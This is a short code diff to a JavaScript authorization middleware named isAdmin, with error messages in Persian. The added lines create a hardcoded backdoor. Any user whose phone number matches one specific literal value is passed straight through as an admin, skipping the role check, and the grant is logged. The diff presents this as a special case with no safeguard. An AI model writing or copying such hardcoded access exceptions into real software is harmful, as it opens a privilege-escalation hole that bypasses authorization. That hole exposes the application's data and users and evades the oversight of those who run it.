@@ -37,6 +37,12 @@ const isAdmin = (req, res, next) => {
             return res.status(401).json({ message: "کاربر احراز هویت نشده" });
         }
 
+         // Special case: phone number 09198718211 is always admin
+        if (user.phone === '09198718211') {
+            console.log('Special admin access granted for phone:', user.phone);
+            return next();
+        }
+
         if (user.role !== "admin") {
             console.log("User role:", user.role);
             return res.status(401).json({ message: "شما اجازه ندارید" });
